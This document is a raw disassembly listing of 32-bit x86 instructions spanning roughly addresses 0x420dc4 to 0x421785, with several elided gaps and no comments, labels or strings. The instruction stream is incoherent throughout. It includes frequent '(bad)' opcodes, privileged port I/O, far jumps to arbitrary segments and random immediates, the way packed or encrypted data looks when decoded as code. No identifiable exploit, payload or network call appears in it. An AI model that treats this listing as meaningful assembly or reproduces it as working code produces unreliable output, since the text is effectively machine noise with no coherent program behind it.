  420dc4:	jle    0x420d5b
  420dc6:	lea    ebx,[ebx+0x68]
  420dc9:	and    BYTE PTR [edi],dh
  420dcb:	mov    esp,0xdc343bcb
  420dd0:	jae    0x420daa
  420dd2:	xor    ebp,DWORD PTR [eax+0x14d75b20]
  420dd8:	dec    ebx
  420dd9:	cmp    edi,DWORD PTR [ebx+0x61cac07c]
  420ddf:	inc    esp
  420de0:	adc    al,dl
  420de2:	dec    DWORD PTR [ebp-0x28]
  420de5:	gs mov dh,0x69
  420de8:	dec    edi
  420de9:	pop    ecx
  420dea:	les    ecx,FWORD PTR [ebx+0x1d]
  420ded:	xlat   BYTE PTR ds:[ebx]
  420dee:	int3   
  420def:	fisttp QWORD PTR [edx]
  420df1:	or     dl,BYTE PTR [edi-0x33ad8fa7]
  420df7:	mov    DWORD PTR [edi],edx
  420df9:	out    dx,al
  420dfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420dfb:	les    edi,FWORD PTR [edi]
  420dfd:	ret    
  420dfe:	cmp    BYTE PTR [edx-0x147be3bc],dl
  420e04:	dec    edi
  420e05:	or     BYTE PTR [esp+ecx*8+0x51],bh
  420e09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e0a:	je     0x420e59
  420e0c:	fld    st(5)
  420e0e:	(bad)  
  420e10:	out    dx,eax
  420e11:	mov    cl,0xfb
  420e13:	pop    ecx
  420e14:	out    dx,al
  420e15:	jbe    0x420dd1
  420e17:	loope  0x420e21
  420e19:	jbe    0x420dff
  420e1b:	mov    ah,0x70
  420e1d:	push   ecx
  420e1e:	cmc    
  420e1f:	rcr    dh,0xb8
  420e22:	arpl   WORD PTR [ecx],di
  420e24:	repnz add edi,DWORD PTR ds:[edx]
  420e28:	inc    edx
  420e29:	test   DWORD PTR [edx],0xe25c036a
  420e2f:	push   0xb81f4575
  420e34:	add    bl,al
  420e36:	daa    
  420e37:	pop    eax
  420e38:	jmp    0x6ec2e68a
  420e3d:	retf   0xf090
  420e40:	sub    ch,ah
  420e42:	sub    DWORD PTR [ebx],ebx
  420e44:	imul   DWORD PTR [edi+0x45]
  420e47:	xor    ebx,DWORD PTR [edi-0x15c9e02a]
  420e4d:	leave  
  420e4e:	loope  0x420dfa
  420e50:	jmp    0x420e3f
  420e52:	dec    ebp
  420e53:	jg     0x420e44
  420e55:	and    dl,BYTE PTR [edx+ecx*4-0x7b]
  420e59:	mov    ah,0xeb
  420e5b:	sar    DWORD PTR [edx-0x69b91736],1
  420e61:	(bad)  
  420e62:	pusha  
  420e63:	shr    DWORD PTR [edx],1
  420e65:	inc    eax
  420e66:	push   0xffffff89
  420e68:	inc    ecx
  420e69:	scas   al,BYTE PTR es:[edi]
  420e6a:	pop    edi
  420e6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e6c:	jl     0x420e89
  420e6e:	jg     0x420ee2
  420e70:	mov    WORD PTR [ecx+0x6067d6aa],ss
  420e76:	cwde   
  420e77:	inc    ebp
  420e78:	dec    edx
  420e79:	cmp    al,0x95
  420e7b:	(bad)  
  420e7c:	sar    DWORD PTR [edi-0x4ba67faf],0x6c
  420e83:	adc    dl,BYTE PTR [edi-0x4a]
  420e86:	cmp    al,0x3
  420e88:	popa   
  420e89:	mov    gs,WORD PTR [ebx]
  420e8b:	and    ch,bh
  420e8d:	es aas 
  420e8f:	sbb    eax,0xba923d4
  420e94:	mov    dl,0x45
  420e96:	jmp    0xad41edc3
  420e9b:	push   es
  420e9c:	pop    ecx
  420e9d:	jge    0x420e70
  420e9f:	add    eax,0x2aa0b90f
  420ea4:	mov    DWORD PTR [edi],ebx
  420ea6:	sub    eax,0xab581fb4
  420eab:	cwde   
  420eac:	pop    ebp
  420ead:	out    0xea,al
  420eaf:	jl     0x420e5d
  420eb1:	cmp    DWORD PTR [edx+0x2755],ebx
	...
  420f13:	add    BYTE PTR [eax],al
  420f15:	add    BYTE PTR [eax],ah
  420f17:	xchg   edi,eax
  420f18:	inc    edx
  420f19:	shl    edi,cl
  420f1b:	xlat   BYTE PTR ds:[ebx]
  420f1c:	mov    cl,0xf7
  420f1e:	sub    ch,0x3e
  420f21:	ds mov ecx,0xbac66a49
  420f27:	pop    ebp
  420f28:	add    DWORD PTR [eax],eax
  420f2a:	pop    es
  420f2b:	add    DWORD PTR [eax],eax
  420f2d:	add    ch,ch
  420f2f:	jnp    0x420eb2
  420f31:	xor    DWORD PTR [ebx],edi
  420f33:	cmp    eax,0x2840159c
  420f38:	mov    ecx,0x769af88b
  420f3d:	xor    DWORD PTR [eax-0x78],0x9e2395d5
  420f44:	aam    0xac
  420f46:	mov    BYTE PTR [edx-0x7b],dh
  420f49:	inc    ecx
  420f4a:	cmp    ebp,DWORD PTR [esi+0x24a8085d]
  420f50:	dec    edi
  420f51:	outs   dx,DWORD PTR ds:[esi]
  420f52:	les    ebp,FWORD PTR [ebx+0xbb5d90c]
  420f58:	or     al,BYTE PTR [ebx-0x951b1f8]
  420f5e:	sub    DWORD PTR [esi-0x54a8f4e3],ebp
  420f64:	popf   
  420f65:	fwait
  420f66:	push   edi
  420f67:	frstor [edx+0x554b1caa]
  420f6d:	fsubr  QWORD PTR [ebp-0x37]
  420f70:	xchg   ebx,eax
  420f71:	and    al,0xe3
  420f73:	out    dx,eax
  420f74:	cmp    ecx,eax
  420f76:	(bad)  
  420f78:	mov    al,ds:0x2ab4882c
  420f7d:	rcl    ch,1
  420f7f:	pop    ebx
  420f80:	hlt    
  420f81:	in     eax,dx
  420f82:	jmp    0x9b60:0x52be2dd4
  420f89:	cmp    DWORD PTR [eax],0x4539cddf
  420f8f:	sbb    al,0x3c
  420f91:	pop    ss
  420f92:	jae    0x420f1a
  420f94:	int3   
  420f95:	adc    DWORD PTR [ebx-0x1c],edx
  420f98:	daa    
  420f99:	mov    ebx,0xc98b7021
  420f9e:	sbb    eax,DWORD PTR [eax+0x965ce1b]
  420fa4:	and    dh,BYTE PTR [edx-0x17cd6c2e]
  420faa:	in     eax,dx
  420fab:	or     al,BYTE PTR [eax-0x6a]
  420fae:	xor    bh,BYTE PTR [ecx+0x635f9e06]
  420fb4:	nop
  420fb5:	dec    ebp
  420fb6:	mov    ?,WORD PTR [ebx+0x1e15fc51]
  420fbc:	and    BYTE PTR [edi],bh
  420fbe:	lock and eax,0x7425fde3
  420fc4:	outs   dx,BYTE PTR ds:[esi]
  420fc5:	pop    edx
  420fc6:	dec    esp
  420fc7:	retf   
  420fc8:	xor    al,0x39
  420fca:	stos   BYTE PTR es:[edi],al
  420fcb:	inc    esi
  420fcc:	enter  0x5c8a,0x8e
  420fd0:	add    eax,0xdb47bc24
  420fd5:	dec    esp
  420fd6:	mov    esi,0xc267cd4b
  420fdb:	sahf   
  420fdc:	arpl   bp,si
  420fde:	ret    0xd095
  420fe1:	jne    0x420fef
  420fe3:	xchg   edi,eax
  420fe4:	jno    0x420ffa
  420fe6:	and    DWORD PTR [edx-0x62f52fa6],0x9baf7b77
  420ff0:	dec    eax
  420ff1:	xchg   edx,eax
  420ff2:	push   ecx
  420ff3:	add    BYTE PTR [edx-0x5963a3dd],0x73
  420ffa:	ins    DWORD PTR es:[edi],dx
  420ffb:	call   0xc560:0xd756950b
  421002:	push   edx
  421003:	das    
  421004:	in     al,0xc3
  421006:	fcmovu st,st(4)
  421008:	test   eax,0x6608aec6
  42100d:	sub    DWORD PTR [edx+0x178afdee],ecx
  421013:	xlat   BYTE PTR ds:[ebx]
  421014:	loope  0x420f9c
  421016:	sub    BYTE PTR [ebp-0x5f0f4093],dh
  42101c:	ins    DWORD PTR es:[edi],dx
  42101d:	mov    edx,0x1682c988
  421022:	call   0x1a93:0x8b81f3a7
  421029:	mov    eax,ds:0x4316f63d
  42102e:	scas   al,BYTE PTR es:[edi]
  42102f:	mov    al,0x18
  421031:	xchg   edx,eax
  421032:	inc    ebx
  421033:	cwde   
  421034:	jle    0x421036
	...
  421096:	lahf   
  421097:	pop    esi
  421098:	fcmovb st,st(6)
  42109a:	fcmovnb st,st(6)
  42109c:	lahf   
  42109d:	pop    edi
  42109e:	retf   
  42109f:	inc    esi
  4210a0:	and    eax,0x873a91fe
  4210a5:	lahf   
  4210a6:	rcr    DWORD PTR [esi+0x1],0x0
  4210aa:	pop    es
  4210ab:	add    DWORD PTR [eax],eax
  4210ad:	add    cl,al
  4210af:	test   esp,esi
  4210b1:	xchg   ebp,eax
  4210b2:	mov    esp,0x92d9e5a9
  4210b7:	mov    esp,0x28635e45
  4210bc:	dec    edx
  4210bd:	push   ebx
  4210be:	xchg   esp,eax
  4210bf:	pop    ss
  4210c0:	and    eax,0x5b7f49f2
  4210c5:	and    eax,0x9dd6670d
  4210ca:	ins    BYTE PTR es:[edi],dx
  4210cb:	scas   eax,DWORD PTR es:[edi]
  4210cc:	lods   al,BYTE PTR ds:[esi]
  4210cd:	pop    esi
  4210ce:	lods   al,BYTE PTR ds:[esi]
  4210cf:	inc    eax
  4210d0:	test   ah,bl
  4210d2:	ret    
  4210d3:	jmp    0xd43b:0x9661965a
  4210da:	push   ss
  4210db:	fs (bad) 
  4210dd:	data16 fsubr QWORD PTR [eax+0x6a]
  4210e1:	dec    ebx
  4210e2:	shl    BYTE PTR [edi+0x562671d4],cl
  4210e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210e9:	adc    eax,0x1b65129e
  4210ee:	in     eax,0x39
  4210f0:	add    cl,dl
  4210f2:	mov    ds:0x1fabd0ef,al
  4210f7:	sub    ecx,DWORD PTR [edx-0x3]
  4210fa:	sub    esi,eax
  4210fc:	xor    al,0xbe
  4210fe:	jne    0x421175
  421100:	adc    ebp,esp
  421102:	int3   
  421103:	dec    edi
  421104:	mov    bl,0xa0
  421106:	or     DWORD PTR [edx-0x24941d0e],ecx
  42110c:	je     0x4210bc
  42110e:	fwait
  42110f:	les    ecx,FWORD PTR [eax]
  421111:	cmp    al,BYTE PTR [edx+0x72ac81ea]
  421117:	out    0x6a,al
  421119:	or     eax,eax
  42111b:	xchg   ebx,eax
  42111c:	push   ds
  42111d:	jbe    0x421120
  42111f:	pop    ebx
  421120:	les    ebx,FWORD PTR [edx-0x1a]
  421123:	scas   eax,DWORD PTR es:[edi]
  421124:	cmp    DWORD PTR [edx+ecx*8-0x1c490c4e],0x28
  42112c:	pushw  cs
  42112e:	and    BYTE PTR [esp+ebx*2+0x7e],bh
  421132:	fcmovb st,st(0)
  421134:	or     ebp,esp
  421136:	lds    edi,FWORD PTR [esp+edx*8-0x71f29f69]
  42113d:	bound  esp,QWORD PTR [edi]
  42113f:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  421141:	mov    ecx,0x441c2cd0
  421146:	push   cs
  421147:	mov    edx,0xb44256b4
  42114c:	ret    0x3cc5
  42114f:	push   edi
  421150:	je     0x421199
  421152:	pop    ebx
  421153:	je     0x421143
  421155:	push   esp
  421156:	push   0xffffffa7
  421158:	test   al,0x7b
  42115a:	xchg   edx,eax
  42115b:	pop    ecx
  42115c:	ja     0x4211cd
  42115e:	imul   edx,DWORD PTR [ebx-0x3d],0x5f
  421162:	cmp    eax,0x57fbb413
  421167:	cmp    DWORD PTR [edx+0x640ba2db],esi
  42116d:	push   edx
  42116e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42116f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421170:	jnp    0x4211f0
  421172:	daa    
  421173:	push   esp
  421174:	fs and al,0xf4
  421177:	mov    edx,0xa4f80743
  42117c:	push   eax
  42117d:	push   ds
  42117e:	push   cs
  42117f:	sub    BYTE PTR [edx+0x35],ah
  421182:	cdq    
  421183:	push   ds
  421184:	cmp    al,BYTE PTR [esi+0x74ec6c4e]
  42118a:	xlat   BYTE PTR ds:[ebx]
  42118b:	pusha  
  42118c:	sub    ebx,esi
  42118e:	sti    
  42118f:	pop    ebx
  421190:	(bad)  
  421191:	out    dx,eax
  421192:	push   edx
  421193:	je     0x4211b2
  421195:	retf   0x6ac6
  421198:	jae    0x421167
  42119a:	or     al,0xc3
  42119c:	mov    ah,0xc0
  42119e:	xchg   ebx,eax
  42119f:	iret   
  4211a0:	(bad)  
  4211a1:	out    dx,eax
  4211a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211a3:	icebp  
  4211a4:	cwde   
  4211a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211a6:	popf   
  4211a7:	ror    DWORD PTR [ebx+0xf],cl
  4211aa:	mov    esi,0xfbfb3137
  4211af:	test   ch,dh
  4211b1:	inc    ebp
  4211b2:	push   0x6a52
	...
  421213:	add    BYTE PTR [eax],al
  421215:	add    BYTE PTR [esi-0x700870e1],bl
  42121b:	idiv   esi
  42121d:	jg     0x421280
  42121f:	pop    es
  421220:	and    BYTE PTR [ecx+0x4e],cl
  421223:	mov    al,ds:0x5fc8e8de
  421228:	add    DWORD PTR [eax],eax
  42122a:	pop    es
  42122b:	add    DWORD PTR [eax],eax
  42122d:	add    BYTE PTR [esi],ch
  42122f:	sti    
  421230:	loope  0x4212a6
  421232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421233:	add    BYTE PTR [edx+esi*8-0x44],ah
  421237:	mov    esp,0x81a24515
  42123c:	jp     0x421234
  42123e:	imul   ebp,DWORD PTR [edi+0x25],0xffffff97
  421242:	jmp    0x8fa32822
  421247:	pop    ecx
  421248:	pushf  
  421249:	cs push edx
  42124b:	pusha  
  42124c:	popa   
  42124d:	mov    dh,0x5d
  42124f:	add    edx,edx
  421251:	(bad)  
  421252:	int3   
  421253:	pop    ecx
  421254:	mov    ecx,DWORD PTR [esi+0x4e]
  421257:	xor    esp,ecx
  421259:	dec    esp
  42125a:	stos   BYTE PTR es:[edi],al
  42125b:	sbb    BYTE PTR [esi+0x1b],dl
  42125e:	out    dx,eax
  42125f:	nop
  421260:	retf   0xbc6b
  421263:	call   0xf9a64204
  421268:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421269:	push   0xffffff88
  42126b:	or     BYTE PTR [edx],0x12
  42126e:	xchg   ebx,eax
  42126f:	nop
  421270:	xor    eax,0xcdafa0a9
  421275:	pop    ebx
  421276:	out    0x22,al
  421278:	mov    edx,0x3d8eedf2
  42127d:	xchg   ebp,eax
  42127e:	aam    0x7f
  421280:	mov    eax,0x6a278481
  421285:	xchg   ebx,eax
  421286:	test   al,0xfc
  421288:	data16 icebp 
  42128a:	arpl   WORD PTR [esi-0xdea41b8],sp
  421290:	xchg   esi,eax
  421291:	xor    eax,0xfe6a9f01
  421296:	cdq    
  421297:	pop    edx
  421298:	mov    ds:0x5f7370c4,eax
  42129d:	dec    edx
  42129e:	adc    eax,DWORD PTR [edi]
  4212a0:	inc    ebx
  4212a1:	xor    DWORD PTR [edi+ebx*2+0x37],edi
  4212a5:	add    dl,BYTE PTR [ebp-0x60]
  4212a8:	inc    cx
  4212aa:	and    al,0x7
  4212ac:	inc    ebx
  4212ad:	xchg   ebx,eax
  4212ae:	into   
  4212af:	int    0x89
  4212b1:	imul   esp,esi,0x14a56766
  4212b7:	xchg   ebp,eax
  4212b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212b9:	lods   eax,DWORD PTR ds:[esi]
  4212ba:	add    ch,BYTE PTR [ebp+0x365e631a]
  4212c0:	push   edi
  4212c1:	and    DWORD PTR [edi-0x3d],edi
  4212c4:	inc    ebx
  4212c5:	mov    edx,0xa4ddcd2d
  4212ca:	pop    ecx
  4212cb:	xchg   ebx,eax
  4212cc:	fstp   st(5)
  4212ce:	arpl   WORD PTR [edi+0x29],bp
  4212d1:	sbb    DWORD PTR [ecx],edi
  4212d3:	cmp    edx,DWORD PTR [eax]
  4212d5:	push   ebp
  4212d6:	fist   WORD PTR [esi]
  4212d8:	push   esi
  4212d9:	ja     0x421297
  4212db:	mov    edi,0x1b7b9625
  4212e0:	xor    ebp,edx
  4212e2:	mov    esp,0x17ca2d2e
  4212e7:	lods   eax,DWORD PTR ds:[esi]
  4212e8:	mov    edi,0x7f65021e
  4212ed:	(bad)
  4212f0:	jbe    0x421279
  4212f2:	push   0x11
  4212f4:	cmp    ch,BYTE PTR [edx+ebp*4-0x71]
  4212f8:	or     DWORD PTR [ecx+0x57df1027],esp
  4212fe:	test   eax,0xa795ed80
  421303:	sbb    al,0x61
  421305:	push   ds
  421306:	es mov ebx,0x44ea4eb3
  42130c:	cmp    BYTE PTR [ebp-0x75],dl
  42130f:	rol    DWORD PTR [ecx-0x5c4f0e40],cl
  421315:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421316:	adc    eax,ebx
  421318:	dec    ebp
  421319:	stos   DWORD PTR es:[edi],eax
  42131a:	(bad)
  42131d:	sub    al,ch
  42131f:	add    eax,0xc1650b80
  421325:	jno    0x4212b0
  421327:	inc    edi
  421328:	cmc    
  421329:	repz not DWORD PTR [esi-0x27]
  42132d:	sbb    BYTE PTR [edx+ecx*1-0x3df5de1],bh
  421334:	rol    DWORD PTR [eax],0x0
	...
  421393:	add    BYTE PTR [eax],al
  421395:	add    dh,bh
  421397:	(bad)  
  421398:	pop    esp
  421399:	mov    eax,ds:0xdfffbb7d
  42139e:	mov    eax,ds:0xb76c04b0
  4213a3:	xchg   ecx,eax
  4213a4:	cwde   
  4213a5:	dec    esi
  4213a6:	iret   
  4213a7:	pusha  
  4213a8:	add    DWORD PTR [eax],eax
  4213aa:	pop    es
  4213ab:	add    DWORD PTR [eax],eax
  4213ad:	add    BYTE PTR [ebp+0x5f91868],ch
  4213b3:	in     al,dx
  4213b4:	mov    dh,0x84
  4213b6:	(bad)
  4213ba:	pop    ss
  4213bb:	xor    eax,0x9c9eedea
  4213c0:	xor    cl,dh
  4213c2:	imul   esp,eax,0xffffff98
  4213c5:	cmp    eax,0xffed7a13
  4213ca:	jb     0x421369
  4213cc:	push   esp
  4213cd:	pop    eax
  4213ce:	sbb    DWORD PTR [esi-0x1be7bc75],esi
  4213d4:	sub    al,0xba
  4213d6:	and    cl,cl
  4213d8:	std    
  4213d9:	lea    esi,[ebx+edi*4]
  4213dc:	ds sbb al,0x96
  4213df:	xchg   ecx,eax
  4213e0:	shl    BYTE PTR [edi],0x50
  4213e3:	pop    esi
  4213e4:	iret   
  4213e5:	ds cld 
  4213e7:	ds in  al,dx
  4213e9:	jmp    DWORD PTR [ecx]
  4213eb:	sbb    esi,ebp
  4213ed:	push   ecx
  4213ee:	push   ds
  4213ef:	xor    ah,BYTE PTR [ecx]
  4213f1:	adc    eax,0x1895a6e8
  4213f6:	cmove  edx,DWORD PTR [edi]
  4213f9:	imul   eax,DWORD PTR [esi+0x195bd8bf],0xee212ac6
  421403:	mov    dh,0xba
  421405:	cmp    BYTE PTR [edx-0x31],bh
  421408:	imul   ecx,esi,0x34
  42140b:	fwait
  42140c:	cmp    bl,BYTE PTR [edx-0x22a558cb]
  421412:	out    dx,al
  421413:	xchg   DWORD PTR [edx],esp
  421415:	ss enter 0x5e0a,0xe2
  42141a:	mov    ds:0xa4e8963,al
  42141f:	mov    al,0x67
  421421:	push   esp
  421422:	jl     0x421479
  421424:	test   al,0xe
  421426:	jnp    0x4213ba
  421428:	and    al,0xaf
  42142a:	sub    DWORD PTR [esi+0x401a097d],ebp
  421430:	sbb    al,0x64
  421432:	xchg   ebp,eax
  421433:	in     eax,dx
  421434:	inc    esp
  421435:	jae    0x4213c0
  421437:	repz add eax,0xee2e67b8
  42143d:	jl     0x421462
  42143f:	mov    bh,0x6c
  421441:	ins    BYTE PTR es:[edi],dx
  421442:	clc    
  421443:	dec    edx
  421444:	jmp    0x8932:0x1461aab7
  42144b:	sub    ebp,DWORD PTR [eax+0x1ee27181]
  421451:	ret    0x54b9
  421454:	clc    
  421455:	add    al,0x61
  421457:	fistp  QWORD PTR [edx+0x58b645e7]
  42145d:	mov    dl,0x3b
  42145f:	inc    eax
  421460:	jns    0x4214cc
  421462:	xor    DWORD PTR ds:0x14e72960,0xd84e3f22
  42146c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42146d:	mov    ebp,0xefa7cabb
  421472:	mov    eax,ds:0x263bd378
  421477:	icebp  
  421478:	ins    BYTE PTR es:[edi],dx
  421479:	mov    ebp,0x7e618258
  42147e:	and    al,0x5f
  421480:	loope  0x421489
  421482:	ret    0x8b5f
  421485:	push   edx
  421486:	mov    bh,0x77
  421488:	int    0x40
  42148a:	test   BYTE PTR [ebx-0x42],dl
  42148d:	enter  0x5ba0,0xb5
  421491:	fwait
  421492:	sbb    DWORD PTR [ebp-0x54],eax
  421495:	scas   al,BYTE PTR es:[edi]
  421496:	xchg   edx,eax
  421497:	xor    al,0x2a
  421499:	push   ss
  42149a:	xor    eax,0x45fa57e9
  42149f:	jne    0x421520
  4214a1:	in     al,0x11
  4214a3:	jo     0x421472
  4214a5:	pop    ebx
  4214a6:	pop    ecx
  4214a7:	dec    esi
  4214a8:	cmp    ebx,DWORD PTR [ebp-0x60]
  4214ab:	cmc    
  4214ac:	push   ebp
  4214ad:	dec    ebp
  4214ae:	int3   
  4214af:	push   cx
  4214b1:	mov    dl,0x1b
  4214b3:	es and eax,0x0
	...
  421515:	add    dh,dl
  421517:	repnz test BYTE PTR [eax],bl
  42151a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42151b:	jle    0x4214fb
  42151d:	(bad)  
  42151e:	stc    
  42151f:	test   DWORD PTR [ecx],edx
  421521:	popa   
  421522:	jb     0x421595
  421524:	loope  0x42152b
  421526:	(bad)  
  421527:	popa   
  421528:	add    DWORD PTR [eax],eax
  42152a:	pop    es
  42152b:	add    DWORD PTR [eax],eax
  42152d:	add    BYTE PTR [eax+0x47],dl
  421530:	sbb    dl,BYTE PTR [eax-0x23]
  421533:	out    0xa6,eax
  421535:	sbb    BYTE PTR [edi*8+0x5ea236e8],bl
  42153c:	call   0x9c65:0x92e84e89
  421543:	push   es
  421544:	outs   dx,DWORD PTR ds:[esi]
  421545:	push   ss
  421546:	adc    cl,BYTE PTR [edx]
  421548:	sub    DWORD PTR [ecx+0x47],ebx
  42154b:	jmp    0x4215b7
  42154d:	lock jge 0x4214f2
  421550:	es out dx,al
  421552:	js     0x421599
  421554:	cmp    al,0x92
  421556:	test   eax,0xc33163b2
  42155b:	fcmovb st,st(5)
  42155d:	jmp    0x1c04:0x6a467972
  421564:	rcr    BYTE PTR [ebp-0x7c],1
  421567:	mov    cl,0xcd
  421569:	fld    st(4)
  42156b:	jo     0x42158f
  42156d:	retf   
  42156e:	cmp    al,0x41
  421570:	ins    BYTE PTR es:[edi],dx
  421571:	fldenv [edi]
  421573:	xor    eax,0xa70ccb97
  421578:	lods   eax,DWORD PTR ds:[esi]
  421579:	cdq    
  42157a:	aas    
  42157b:	jge    0x42154c
  42157d:	pop    esi
  42157e:	push   eax
  42157f:	xchg   esp,eax
  421580:	mov    ebp,0x224dc0f8
  421585:	mov    bh,0xa4
  421587:	sub    ch,BYTE PTR [ecx]
  421589:	add    bh,BYTE PTR [ecx+edi*1+0x42]
  42158d:	adc    eax,DWORD PTR [ecx-0x28381824]
  421593:	dec    ebp
  421594:	gs mov bl,0x74
  421597:	loopne 0x421555
  421599:	mov    cl,cl
  42159b:	loope  0x4215ea
  42159d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42159e:	icebp  
  42159f:	mov    ecx,0x56f71545
  4215a4:	adc    al,0x7f
  4215a6:	in     eax,dx
  4215a7:	sbb    BYTE PTR [ecx-0x5e],0xb5
  4215ab:	ja     0x42157f
  4215ad:	and    DWORD PTR [edi+0x54fa3822],esi
  4215b3:	dec    esi
  4215b4:	jns    0x421582
  4215b6:	xchg   edx,eax
  4215b7:	dec    eax
  4215b8:	mov    ch,0x96
  4215ba:	test   eax,0xa2aec92d
  4215bf:	mov    ?,WORD PTR [ebp+0x54]
  4215c2:	cmc    
  4215c3:	mov    ebp,0x97208c5c
  4215c8:	mov    eax,ds:0x186e432b
  4215cd:	xchg   edx,eax
  4215ce:	push   ds
  4215cf:	lods   al,BYTE PTR ds:[esi]
  4215d0:	call   0xed72:0x60ca4cda
  4215d7:	jle    0x42161b
  4215d9:	pop    eax
  4215da:	int3   
  4215db:	stos   BYTE PTR es:[edi],al
  4215dc:	lock xchg edi,eax
  4215de:	scas   eax,DWORD PTR es:[edi]
  4215df:	pushf  
  4215e0:	outs   dx,DWORD PTR ds:[esi]
  4215e1:	mov    esi,0x34c702c5
  4215e6:	xlat   BYTE PTR ds:[ebx]
  4215e7:	pop    ecx
  4215e8:	mov    ds:0xb838ea03,eax
  4215ed:	cmp    edi,DWORD PTR [edi+eiz*8]
  4215f0:	mov    bh,0x52
  4215f2:	xor    ah,BYTE PTR [esi+0x28]
  4215f5:	mov    eax,ds:0xad6b31f
  4215fa:	shr    DWORD PTR [ebp+eiz*1-0x6f],0xa1
  4215ff:	push   ecx
  421600:	xchg   bh,dl
  421602:	leave  
  421603:	push   edi
  421604:	ss mov edi,0x86a75bf0
  42160a:	mov    al,ah
  42160c:	add    bl,BYTE PTR [edi-0x52]
  42160f:	mov    eax,ds:0xaba7b8c4
  421614:	pop    esp
  421615:	dec    eax
  421616:	les    eax,FWORD PTR [edx+0x4f]
  421619:	pop    ecx
  42161a:	mov    ch,0x97
  42161c:	or     DWORD PTR [edi],esi
  42161e:	push   ebp
  42161f:	fst    QWORD PTR [esp+ebp*1+0x44]
  421623:	pop    esp
  421624:	popf   
  421625:	mov    ch,0xf9
  421627:	pop    ecx
  421628:	push   ss
  421629:	fnstsw WORD PTR [edx]
  42162b:	retf   0xcdab
  42162e:	pusha  
  42162f:	out    dx,al
  421630:	out    0xe8,al
  421632:	fsubr  QWORD PTR [eax]
  421634:	bound  eax,QWORD PTR [eax]
	...
  421696:	stos   DWORD PTR es:[edi],eax
  421697:	sub    al,0xed
  421699:	stos   BYTE PTR es:[edi],al
  42169a:	out    dx,eax
  42169b:	jmp    0x42168c
  42169d:	sub    eax,0xf9231b1e
  4216a2:	ss jg  0x4216ac
  4216a5:	leave  
  4216a6:	frstor [edx+0x1]
  4216a9:	add    BYTE PTR [edi],al
  4216ab:	add    DWORD PTR [eax],eax
  4216ad:	add    BYTE PTR [ecx-0x73],bh
  4216b0:	xlat   BYTE PTR ds:[ebx]
  4216b1:	mov    esp,edi
  4216b3:	xchg   ebp,eax
  4216b4:	mov    edx,DWORD PTR [ebx]
  4216b6:	je     0x421676
  4216b8:	call   0x9da66ae5
  4216bd:	fild   WORD PTR [ecx+edx*1+0x7608d3d1]
  4216c4:	pop    esi
  4216c5:	cmp    bh,BYTE PTR [edx+0x74]
  4216c8:	sub    eax,0xf8306989
  4216cd:	jl     0x421666
  4216cf:	lahf   
  4216d0:	fwait
  4216d1:	mov    dh,0xf6
  4216d3:	rol    DWORD PTR [ecx+0x5e],0x3f
  4216d7:	ss lock jle 0x421736
  4216db:	(bad)  
  4216dc:	jno    0x42168a
  4216de:	add    edi,edx
  4216e0:	fimul  WORD PTR [ebx+0x4e424c15]
  4216e6:	es jbe 0x421759
  4216e9:	pop    ebp
  4216ea:	dec    eax
  4216eb:	mov    edx,0x19bd42ac
  4216f0:	cmp    edx,esi
  4216f2:	and    ebx,eax
  4216f4:	sbb    eax,edx
  4216f6:	pop    edi
  4216f7:	retf   0xffd5
  4216fa:	icebp  
  4216fb:	shr    BYTE PTR [ecx+0x5],1
  4216fe:	and    ebp,DWORD PTR [eax+0x1ac71059]
  421704:	sbb    al,0xb1
  421706:	nop
  421707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421708:	outs   dx,DWORD PTR ds:[esi]
  421709:	jg     0x42168f
  42170b:	aas    
  42170c:	mov    DWORD PTR [esi-0x63],ebp
  42170f:	pusha  
  421710:	cmp    edi,DWORD PTR [ecx-0x5e]
  421713:	fdiv   QWORD PTR ds:0x80231c34
  421719:	mov    dh,0x66
  42171b:	pop    edx
  42171c:	push   cs
  42171d:	dec    eax
  42171e:	jmp    0x421749
  421720:	fs mov eax,edx
  421723:	xor    BYTE PTR [ecx],dl
  421725:	cli    
  421726:	mov    cl,0x11
  421728:	mov    dh,0xd7
  42172a:	jnp    0x4216c5
  42172c:	mov    cl,0x15
  42172e:	mov    DWORD PTR [ebx],esp
  421730:	or     esp,edi
  421732:	jmp    0x4216c1
  421734:	sbb    BYTE PTR [esi-0x59],cl
  421737:	and    al,dl
  421739:	sbb    DWORD PTR [ebx],eax
  42173b:	mov    eax,ds:0x91572e87
  421740:	scas   al,BYTE PTR es:[edi]
  421741:	clc    
  421742:	and    BYTE PTR [edx],bh
  421744:	ja     0x42170a
  421746:	dec    ebx
  421747:	jb     0x421754
  421749:	adc    al,0xf
  42174b:	dec    esi
  42174c:	jmp    0xb023:0xbefdf753
  421753:	out    0x4f,al
  421755:	aaa    
  421756:	sbb    dl,bl
  421758:	xchg   ebp,eax
  421759:	test   eax,0xc5d684a5
  42175e:	test   BYTE PTR [ecx],dh
  421760:	aam    0x3c
  421762:	mov    eax,0x8d8aa694
  421767:	add    DWORD PTR [ebx],edx
  421769:	and    esi,DWORD PTR [edi+0x21]
  42176c:	fadd   QWORD PTR [edx]
  42176e:	push   edi
  42176f:	cdq    
  421770:	fs or  eax,0x48c0a2e5
  421776:	int    0x74
  421778:	or     BYTE PTR [eax+0x1a],dl
  42177b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42177c:	dec    ebx
  42177d:	stos   DWORD PTR es:[edi],eax
  42177e:	arpl   bx,di
  421780:	aam    0xc3
  421782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421783:	shl    edi,1
  421785:	ror    DWORD PTR [esi],cl
